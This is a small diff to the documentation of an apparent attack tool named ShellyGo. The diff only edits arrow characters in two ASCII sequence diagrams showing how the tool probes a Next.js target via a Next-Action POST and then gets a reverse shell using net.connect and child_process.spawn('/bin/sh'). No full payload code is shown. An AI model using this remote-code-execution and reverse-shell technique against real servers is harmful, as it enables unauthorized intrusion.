@@ -85,14 +85,14 @@ ShellyGo                          Target (Next.js)
    │  POST multipart/form-data          │
    │  Header: Next-Action: x            │
    │  Payload: console.log(7*7+1)       │
-   │ ──────────────────────────────────→ │
+   │ ────────────────────────────────── │
    │                                    │
    │         Flight protocol            │
    │     deserializes the payload       │
    │     → Function("console.log(50)")  │
    │                                    │
    │  HTTP 500 + E{"digest"...}         │
-   │ ←────────────────────────────────── │
+   │ ────────────────────────────────── │
    │                                    │
    │  [+] Target seems vulnerable       │
 ```
@@ -108,14 +108,14 @@ ShellyGo                          Target (Next.js)
    │                                    │
    │  2. POST exploit payload           │
    │     (pure Node.js reverse shell)   │
-   │ ──────────────────────────────────→ │
+   │ ────────────────────────────────── │
    │                                    │
    │         Server executes:           │
    │     net.connect(lhost:lport)       │
    │     child_process.spawn('/bin/sh') │
    │                                    │
    │  3. Reverse shell connects back    │
-   │ ←────────────────────────────────── │
+   │ ────────────────────────────────── │
    │                                    │
    │  [+] Interactive shell as www-data │
 ```
